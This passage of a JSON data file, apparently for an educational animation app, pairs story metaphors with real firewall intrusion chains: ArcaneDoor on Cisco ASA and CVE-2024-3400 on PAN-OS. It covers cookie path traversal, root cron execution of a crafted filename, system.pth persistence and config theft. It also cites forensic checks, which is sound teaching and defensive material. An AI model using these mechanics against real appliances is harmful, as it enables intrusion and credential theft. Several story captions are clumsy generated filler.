          "storyExcerpt": "Once active on the workbench, a silent in-memory agent mutes the watchtower logbook bell and redirects incoming check-in packets so the outsider can inspect traffic and run custom gate commands…",
          "technicalParallel": "Because perimeter network appliances cannot run standard Windows/Linux EDR agents, modifying the running lina process in volatile RAM hides the implant from normal CLI checks, and can only be caught…",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Bell",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Muting the logbook bell",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses muting the logbook bell to advance toward guard handbook text.",
          "technicalParallel": "Inside the ASA’s main lina executable (the monolithic process that handles all firewalling, routing, and VPN sessions on a Cisco ASA), the Line Dancer memory-only implant decodes the incoming shellcode…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Text",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Custom gate commands",
          "storyExcerpt": "Behind the scenes, custom gate commands captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Cisco Talos ArcaneDoor IOC Guide (integrity validation steps for hardware security appliances): verify /md5 system:memory/text hash mismatch on the running ASA lina text segment and…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Fortress Arch",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Core Memory",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Silent Trigger",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1059"
    },
    "step-3": {
      "scenarioId": "talos-arcanedoor-asa",
      "sectionKey": "step-3",
      "sceneKind": "net-arcanedoor-step-3",
      "stageBadge": "STEP #3 · DEFENSE EVASION",
      "title": "\"Line Runner\" Abuses vpn_dessert.zip (CVE-2024-20359) to Survive Firewall Reboots",
      "storyCue": "To survive a full guard shift change and fortress restart, the outsider places a concealed spare bundle inside the basement storage cabinet that automatically unpacks a hidden side-door script every time the fortress powers back on.",
      "technicalCue": "T1562.001 · DEFENSE EVASION — Because Line Dancer lives purely in RAM, rebooting the firewall would normally wipe it out.",
      "storyMappings": [
        {
          "storyTerm": "Basement storage cabinet",
          "technicalTerm": "Persistent flash storage boot filesystem",
          "tone": "amber"
        },
        {
          "storyTerm": "Concealed spare bundle",
          "technicalTerm": "Line Runner archive exploiting CVE-2024-20359",
          "tone": "sky"
        },
        {
          "storyTerm": "Fortress shift restart",
          "technicalTerm": "Device reboot and firmware upgrade cycle",
          "tone": "rose"
        },
        {
          "storyTerm": "Hidden side-door script",
          "technicalTerm": "Persistent unauthorized Lua web handler",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-arcanedoor-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Basement storage cabinet",
          "subtitle": "Persistent flash storage boot filesystem",
          "tone": "amber"
        },
        {
          "id": "net-arcanedoor-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Concealed spare bundle",
          "subtitle": "Line Runner archive exploiting CVE-2024-20359",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Full Side-door",
          "stageTag": "STEP 03 · SETUP",
          "title": "Basement storage cabinet",
          "storyExcerpt": "To survive a full guard shift change and fortress restart, the outsider places a concealed spare bundle inside the basement storage cabinet that automatically unpacks a hidden side-door script…",
          "technicalParallel": "Combining Line Runner (disk0: boot persistence via CVE-2024-20359) with Line Dancer (volatile RAM command execution inside lina) gives the attacker both reboot survival and zero-footprint daily operation.",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Concealed spare bundle",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses concealed spare bundle to advance toward fortress shift restart.",
          "technicalParallel": "Because Line Dancer lives purely in RAM, rebooting the firewall would normally wipe it out.",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Side-door",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Hidden side-door script",
          "storyExcerpt": "Behind the scenes, hidden side-door script captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in Cisco Advisory CVE-2024-20359 and NCSC Guidance (post-incident persistence checks for edge firewalls): unauthorized files on disk0: boot paths and system:memory/text integrity verification…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Fortress Arch",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Core Memory",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Silent Trigger",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1562.001"
    },
    "memory-forensics": {
      "scenarioId": "talos-arcanedoor-asa",
      "sectionKey": "memory-forensics",
      "sceneKind": "net-arcanedoor-memory-xray",
      "stageBadge": "MEMORY FORENSICS · SIDE-BY-SIDE X-RAY COMPARISON",
      "mitreId": "T1542",
      "title": "ArcaneDoor (UAT4356): Cisco ASA Zero-Days, Line Dancer & Line Runner — Process Memory & Artifacts X-Ray",
      "storyCue": "Place the untouched factory blueprint of fortress arch beside a live X-ray of the running workspace. While the outer cover looks identical to every routine security check, the sweeping golden X-ray beam exposes the tampered interior section planted during the intrusion.",
      "technicalCue": "Memory X-Ray: /asa/bin/lina (lina .text (Hooked by Line Dancer) [RWX])",
      "storyMappings": [
        {
          "storyTerm": "Untouched Factory Blueprint (Left)",
          "technicalTerm": "Expected Clean On-Disk Image & Normal Pages of /asa/bin/lina",
          "tone": "sky"
        },
        {
          "storyTerm": "Tampered Live Interior Section (Right)",
          "technicalTerm": "0x0000558A10420000 (RWX, 64 KB) · lina .text (Hooked by Line Dancer)",
          "tone": "rose"
        },
        {
          "storyTerm": "Sweeping Golden X-Ray Scanner",
          "technicalTerm": "Live RAM Triage Comparing Clean Baseline Against /asa/bin/lina (PID 1102)",
          "tone": "amber"
        },
        {
          "storyTerm": "Exposed Hidden Modification Proof",
          "technicalTerm": "Patched WebVPN host-scan-reply handler and crashinfo hook inside /asa/bin/lina.",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-arcanedoor-memory-xray-left",
          "tag": "CLEAN BASELINE · EXPECTED",
          "title": "Untouched Factory Blueprint (Left)",
          "subtitle": "Expected Clean On-Disk Image & Normal Pages of /asa/bin/lina",
          "tone": "sky"
        },
        {
          "id": "net-arcanedoor-memory-xray-right",
          "tag": "LIVE MEMORY · RWX",
          "title": "Tampered Live Interior Section (Right)",
          "subtitle": "0x0000558A10420000 (RWX, 64 KB) · lina .text (Hooked by Line…",
          "tone": "rose"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Clean Baseline",
          "stageTag": "MEMORY 01 · BASELINE",
          "title": "Inspect Expected Clean Blueprint",
          "storyExcerpt": "On the left rests the official untouched blueprint showing every compartment sealed in its normal factory order.",
          "technicalParallel": "Baseline /asa/bin/lina loads standard signed read-only and read-execute sections with zero injected artifacts.",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Tampered Pages",
          "stageTag": "MEMORY 02 · TAMPERING",
          "title": "Golden Scanner Sweeps Both Chambers Side by Side",
          "storyExcerpt": "The overhead golden scanner glides across both chambers, illuminating a glowing crimson block hidden inside the live compartment.",
          "technicalParallel": "Memory inspection flags 0x0000558A10420000 (RWX, 64 KB) containing lina .text (Hooked by Line Dancer).",
          "accentHex": "#FACC15",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. X-Ray Diff",
          "stageTag": "MEMORY 03 · DIFF",
          "title": "Side-by-Side Comparison Proves Runtime Tampering",
          "storyExcerpt": "Even though the outer cover never raised a surface alarm, comparing both chambers side by side proves the interior was altered in motion.",
          "technicalParallel": "Forensic triage of PID 1102 confirms patched region: Patched WebVPN host-scan-reply handler and crashinfo hook inside /asa/bin/lina.",
          "accentHex": "#F43F5E",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.1,
            5.9,
            16
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Clean Baseline",
          "position": [
            -6.4,
            4,
            8.6
          ],
          "target": [
            -4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Live Memory",
          "position": [
            6.4,
            4,
            8.6
          ],
          "target": [
            4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "X-Ray Gantry",
          "position": [
            0,
            8.2,
            8.2
          ],
          "target": [
            0,
            2.1,
            -0.2
          ]
        }
      ]
    }
  },
  "unit42-panos-midnight-eclipse": {
    "briefing": {
      "scenarioId": "unit42-panos-midnight-eclipse",
      "sectionKey": "briefing",
      "sceneKind": "net-midnight-eclipse-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1190",
      "title": "Operation MidnightEclipse: PAN-OS GlobalProtect RCE & UPSTYLE Backdoor — Story-to-Technical Overview",
      "storyCue": "A border tollhouse stamps every traveler ticket into a scratch folder, and an automated courier sweeps that folder every minute while reading each folder label aloud as a spoken order. An outsider submits a twisted ticket label that places a disguised order slip into the courier bin, tricks the courier into running it, and tucks a permanent listener card into the tollhouse rulebook.",
      "technicalCue": "INITIAL ACCESS: SESSID COOKIE PATH TRAVERSAL (CVE-2024-3400) -> EXECUTION: TELEMETRY CRON SHELL EXECUTION (DT_CURL) -> PERSISTENCE: UPSTYLE PYTHON .PTH PERSISTENCE & LOG C2",
      "storyMappings": [
        {
          "storyTerm": "Border tollhouse gateway",
          "technicalTerm": "PAN-OS GlobalProtect firewall appliance",
          "tone": "amber"
        },
        {
          "storyTerm": "Twisted ticket label",
          "technicalTerm": "Path-traversal SESSID cookie string",
          "tone": "sky"
        },
        {
          "storyTerm": "Automated minute courier",
          "technicalTerm": "Root device telemetry cron job (dt_curl)",
          "tone": "rose"
        },
        {
          "storyTerm": "Permanent listener card",
          "technicalTerm": "UPSTYLE Python persistence script in system.pth",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-midnight-eclipse-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Border tollhouse gateway",
          "subtitle": "PAN-OS GlobalProtect firewall appliance",
          "tone": "amber"
        },
        {
          "id": "net-midnight-eclipse-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Twisted ticket label",
          "subtitle": "Path-traversal SESSID cookie string",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Pass",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "SESSID COOKIE PATH TRAVERSAL (CVE-2024-3400)",
          "storyExcerpt": "An outsider sends a traveler pass whose ticket stamp climbs backward out of the ordinary ticket drawer and drops a blank file into the hourly courier tray. The file name itself secretly spells out an…",
          "technicalParallel": "When GlobalProtect processes hipreport.esp, its session serializer calls fopen() using the raw SESSID cookie value as the file path without stripping \"../\" sequences (creating an empty 0-byte file on…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Next Tray",
          "stageTag": "STAGE 02 · EXECUTION",
          "title": "TELEMETRY CRON SHELL EXECUTION (DT_CURL)",
          "storyExcerpt": "When the tollhouse clock strikes the next minute, the privileged automated courier gathers every filename from the tray and hands the raw label straight to the building command desk. The disguised label…",
          "technicalParallel": "Because the attacker never needed to write data into the file, only control its filename via the Step 1 path traversal, even a 0-byte file in the minute/ telemetry folder triggers unauthenticated root…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Keep So",
          "stageTag": "STAGE 03 · PERSISTENCE",
          "title": "UPSTYLE PYTHON .PTH PERSISTENCE & LOG C2",
          "storyExcerpt": "To keep quiet access after the courier finishes, the outsider slips an extra instruction sheet into the tollhouse startup manual so the front gate quietly checks error logs for hidden requests. From that…",
          "technicalParallel": "When the attacker sends a specially formatted HTTPS request with a bogus URL that logs an error into sslvpn_ngx_error.log, the background UPSTYLE inotify daemon parses the embedded Base64 command…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Tollhouse Gate",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Log Drop Box",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Cookie Slip",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "unit42-panos-midnight-eclipse",
      "sectionKey": "step-1",
      "sceneKind": "net-midnight-eclipse-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Directory Traversal in the \"SESSID\" Cookie Creates a File With Backtick Shell Commands",
      "storyCue": "An outsider sends a traveler pass whose ticket stamp climbs backward out of the ordinary ticket drawer and drops a blank file into the hourly courier tray. The file name itself secretly spells out an instruction for the courier to follow later.",
      "technicalCue": "T1190 · INITIAL ACCESS — The attacker sends an unauthenticated HTTPS POST request to /ssl-vpn/hipreport.esp (the Host Information Profile endpoint on the GlobalProtect VPN portal, which is reachable from the internet…",
      "storyMappings": [
        {
          "storyTerm": "Traveler pass ticket stamp",
          "technicalTerm": "SESSID HTTP cookie header",
          "tone": "amber"
        },
        {
          "storyTerm": "Climbing backward out of the drawer",
          "technicalTerm": "Directory traversal sequence (CVE-2024-3400)",
          "tone": "sky"
        },
        {
          "storyTerm": "Hourly courier tray",
          "technicalTerm": "Device telemetry minute staging directory",
          "tone": "rose"
        },
        {
          "storyTerm": "Instruction spelled in the file label",
          "technicalTerm": "Shell command embedded inside a zero-byte filename",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-midnight-eclipse-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Traveler pass ticket stamp",
          "subtitle": "SESSID HTTP cookie header",
          "tone": "amber"
        },
        {
          "id": "net-midnight-eclipse-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Climbing backward out of the drawer",
          "subtitle": "Directory traversal sequence (CVE-2024-3400)",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Pass",
          "stageTag": "STEP 01 · SETUP",
          "title": "Traveler pass ticket stamp",
          "storyExcerpt": "An outsider sends a traveler pass whose ticket stamp climbs backward out of the ordinary ticket drawer and drops a blank file into the hourly courier tray.",
          "technicalParallel": "When GlobalProtect processes hipreport.esp, its session serializer calls fopen() using the raw SESSID cookie value as the file path without stripping \"../\" sequences (creating an empty 0-byte file on…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. File Name",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Climbing backward out of the drawer",
          "storyExcerpt": "The file name itself secretly spells out an instruction for the courier to follow later.",
          "technicalParallel": "The attacker sends an unauthenticated HTTPS POST request to /ssl-vpn/hipreport.esp (the Host Information Profile endpoint on the GlobalProtect VPN portal, which is reachable from the internet before a…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Tray",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Instruction spelled in the file label",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across instruction spelled in the file label while locking down hourly courier tray.",
          "technicalParallel": "Documented in Unit 42, Volexity, and Rapid7 CVE-2024-3400 advisories (incident response reports detailing perimeter appliance exploitation): PAN-OS appweb3 logs showing Cookie…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Tollhouse Gate",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Log Drop Box",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Cookie Slip",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1190"
    },
    "step-2": {
      "scenarioId": "unit42-panos-midnight-eclipse",
      "sectionKey": "step-2",
      "sceneKind": "net-midnight-eclipse-step-2",
      "stageBadge": "STEP #2 · EXECUTION",
      "title": "The Root Telemetry Cron Job (\"dt_curl\") Executes the Malicious Filename as Root",
      "storyCue": "When the tollhouse clock strikes the next minute, the privileged automated courier gathers every filename from the tray and hands the raw label straight to the building command desk. The disguised label executes immediately with master supervisor authority.",
      "technicalCue": "T1059.004 · EXECUTION — Once every minute, the PAN-OS device telemetry cron job (dt_curl / sendTelemetry, a scheduled background script running with full uid=0(root) privileges) loops through every file in…",
      "storyMappings": [
        {
          "storyTerm": "Privileged automated courier",
          "technicalTerm": "Scheduled root dt_curl telemetry utility",
          "tone": "amber"
        },
        {
          "storyTerm": "Building command desk",
          "technicalTerm": "Underlying operating system shell interpreter",
          "tone": "sky"
        },
        {
          "storyTerm": "Master supervisor authority",
          "technicalTerm": "Root privilege execution context",
          "tone": "rose"
        },
        {
          "storyTerm": "External pickup call",
          "technicalTerm": "Outbound staging retrieval initiated by dt_curl",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-midnight-eclipse-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Privileged automated courier",
          "subtitle": "Scheduled root dt_curl telemetry utility",
          "tone": "amber"
        },
        {
          "id": "net-midnight-eclipse-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Building command desk",
          "subtitle": "Underlying operating system shell interpreter",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Next Tray",
          "stageTag": "STEP 02 · SETUP",
          "title": "Privileged automated courier",
          "storyExcerpt": "When the tollhouse clock strikes the next minute, the privileged automated courier gathers every filename from the tray and hands the raw label straight to the building command desk.",
          "technicalParallel": "Because the attacker never needed to write data into the file, only control its filename via the Step 1 path traversal, even a 0-byte file in the minute/ telemetry folder triggers unauthenticated root…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Desk",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Building command desk",
          "storyExcerpt": "The disguised label executes immediately with master supervisor authority.",
          "technicalParallel": "Once every minute, the PAN-OS device telemetry cron job (dt_curl / sendTelemetry, a scheduled background script running with full uid=0(root) privileges) loops through every file in…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Call",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "External pickup call",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across external pickup call while locking down master supervisor authority.",
          "technicalParallel": "Documented by Unit 42 and Volexity (forensic analysis of compromised PAN-OS telemetry logs): /var/log/pan/device_telemetry_send.log containing shell syntax fragments and unexpected outbound connections…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Tollhouse Gate",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Log Drop Box",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Cookie Slip",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1059.004"
    },
    "step-3": {
      "scenarioId": "unit42-panos-midnight-eclipse",
      "sectionKey": "step-3",
      "sceneKind": "net-midnight-eclipse-step-3",
      "stageBadge": "STEP #3 · PERSISTENCE",
      "title": "Deploying the \"UPSTYLE\" Python Webshell in system.pth and Stealing running-config.xml",
      "storyCue": "To keep quiet access after the courier finishes, the outsider slips an extra instruction sheet into the tollhouse startup manual so the front gate quietly checks error logs for hidden requests. From that foothold, the outsider copies the master vault directory listing.",
      "technicalCue": "T1546.016 · PERSISTENCE — Combining Volexity’s and Unit 42’s forensic findings: with root access on the firewall, the attacker steals /opt/pancfg/mgmt/saved-configs/running-config.xml (the master PAN-OS configuration…",
      "storyMappings": [
        {
          "storyTerm": "Tollhouse startup manual",
          "technicalTerm": "Python site-packages system.pth loader file",
          "tone": "amber"
        },
        {
          "storyTerm": "Quiet error-log watcher",
          "technicalTerm": "UPSTYLE web error log command handler",
          "tone": "sky"
        },
        {
          "storyTerm": "Master vault directory",
          "technicalTerm": "Firewall running configuration and credential store",
          "tone": "rose"
        },
        {
          "storyTerm": "Front gate web counter",
          "technicalTerm": "GlobalProtect SSL portal web server",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-midnight-eclipse-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Tollhouse startup manual",
          "subtitle": "Python site-packages system.pth loader file",
          "tone": "amber"
        },
        {
          "id": "net-midnight-eclipse-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Quiet error-log watcher",
          "subtitle": "UPSTYLE web error log command handler",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Keep So",
          "stageTag": "STEP 03 · SETUP",
          "title": "Tollhouse startup manual",
          "storyExcerpt": "To keep quiet access after the courier finishes, the outsider slips an extra instruction sheet into the tollhouse startup manual so the front gate quietly checks error logs for hidden requests.",
          "technicalParallel": "When the attacker sends a specially formatted HTTPS request with a bogus URL that logs an error into sslvpn_ngx_error.log, the background UPSTYLE inotify daemon parses the embedded Base64 command…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Keep So",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Quiet error-log watcher",
          "storyExcerpt": "From that foothold, the outsider copies the master vault directory listing.",
          "technicalParallel": "Combining Volexity’s and Unit 42’s forensic findings: with root access on the firewall, the attacker steals /opt/pancfg/mgmt/saved-configs/running-config.xml (the master PAN-OS configuration file…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Left Gate",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Front gate web counter",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across front gate web counter while locking down master vault directory.",
          "technicalParallel": "Documented in Unit 42 & Volexity advisories: unauthorized entries in /usr/lib/python3.6/site-packages/system.pth, rogue Python processes running exec(base64.b64decode(...)), and unexpected mtime changes…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Tollhouse Gate",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Log Drop Box",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Cookie Slip",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1546.016"
    },
    "memory-forensics": {
      "scenarioId": "unit42-panos-midnight-eclipse",
      "sectionKey": "memory-forensics",
      "sceneKind": "net-midnight-eclipse-memory-xray",
      "stageBadge": "MEMORY FORENSICS · SIDE-BY-SIDE X-RAY COMPARISON",
      "mitreId": "T1190",
      "title": "Operation MidnightEclipse: PAN-OS GlobalProtect RCE & UPSTYLE Backdoor — Process Memory & Artifacts X-Ray",
      "storyCue": "Place the untouched factory blueprint of tollhouse gate beside a live X-ray of the running workspace. While the outer cover looks identical to every routine security check, the sweeping golden X-ray beam exposes the tampered interior section planted during the intrusion.",
      "technicalCue": "Memory X-Ray: python3 (UPSTYLE system.pth) (system.pth -> exec(base64.b64decode(...)) [RWX])",
      "storyMappings": [
        {
          "storyTerm": "Untouched Factory Blueprint (Left)",
          "technicalTerm": "Expected Clean On-Disk Image & Normal Pages of python3 (UPSTYLE system.pth)",
          "tone": "sky"
        },
        {
          "storyTerm": "Tampered Live Interior Section (Right)",
          "technicalTerm": "0x00007F9B40100000 (RWX, 48 KB) · system.pth -> exec(base64.b64decode(...))",
          "tone": "rose"
        },
        {
          "storyTerm": "Sweeping Golden X-Ray Scanner",
          "technicalTerm": "Live RAM Triage Comparing Clean Baseline Against python3 (UPSTYLE system.pth) (PID 18422)",
          "tone": "amber"
        },
        {
          "storyTerm": "Exposed Hidden Modification Proof",
          "technicalTerm": "In-memory Python thread spawned by system.pth watching sslvpn-access.log for img[...] base64 commands.",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-midnight-eclipse-memory-xray-left",
          "tag": "CLEAN BASELINE · EXPECTED",
          "title": "Untouched Factory Blueprint (Left)",
          "subtitle": "Expected Clean On-Disk Image & Normal Pages of python3…",
          "tone": "sky"
        },
        {
          "id": "net-midnight-eclipse-memory-xray-right",
          "tag": "LIVE MEMORY · RWX",
          "title": "Tampered Live Interior Section (Right)",
          "subtitle": "0x00007F9B40100000 (RWX, 48 KB) · system.pth ->…",
          "tone": "rose"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Clean Baseline",
          "stageTag": "MEMORY 01 · BASELINE",
          "title": "Inspect Expected Clean Blueprint",
          "storyExcerpt": "On the left rests the official untouched blueprint showing every compartment sealed in its normal factory order.",
          "technicalParallel": "Baseline python3 (UPSTYLE system.pth) loads standard signed read-only and read-execute sections with zero injected artifacts.",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Tampered Pages",
          "stageTag": "MEMORY 02 · TAMPERING",
          "title": "Golden Scanner Sweeps Both Chambers Side by Side",
          "storyExcerpt": "The overhead golden scanner glides across both chambers, illuminating a glowing crimson block hidden inside the live compartment.",
          "technicalParallel": "Memory inspection flags 0x00007F9B40100000 (RWX, 48 KB) containing system.pth -> exec(base64.b64decode(...)).",
          "accentHex": "#FACC15",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. X-Ray Diff",
          "stageTag": "MEMORY 03 · DIFF",
          "title": "Side-by-Side Comparison Proves Runtime Tampering",
          "storyExcerpt": "Even though the outer cover never raised a surface alarm, comparing both chambers side by side proves the interior was altered in motion.",
          "technicalParallel": "Forensic triage of PID 18422 confirms injected region: In-memory Python thread spawned by system.pth watching sslvpn-access.log for img[...] base64 commands.",
          "accentHex": "#F43F5E",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.1,
            5.9,
            16
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
